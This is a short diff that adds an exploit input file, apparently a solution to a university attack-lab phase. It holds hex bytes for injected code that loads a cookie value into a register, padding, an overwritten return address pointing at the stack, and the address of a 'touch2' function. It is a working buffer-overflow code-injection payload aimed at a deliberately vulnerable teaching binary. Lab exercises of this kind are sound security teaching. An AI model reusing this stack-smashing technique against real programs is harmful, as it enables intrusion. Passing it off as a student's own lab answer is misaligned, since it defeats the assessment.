@@ -1,0 +1,6 @@
+/* Cookie address: 0x6642e664 */
+48 c7 c7 64 e6 42 66 c3 /* 48 c7 c7 64 e6 42 66 c3, byte rep of assembly code */
+00 00 00 00 00 00 00 00 /* find the address of rsp register */
+00 00 00 00 00 00 00 00
+78 52 67 55 00 00 00 00 /* 0x55 67 52 78 */
+cb 18 40 00 00 00 00 00 /* 40 18 cb touch2 function address */
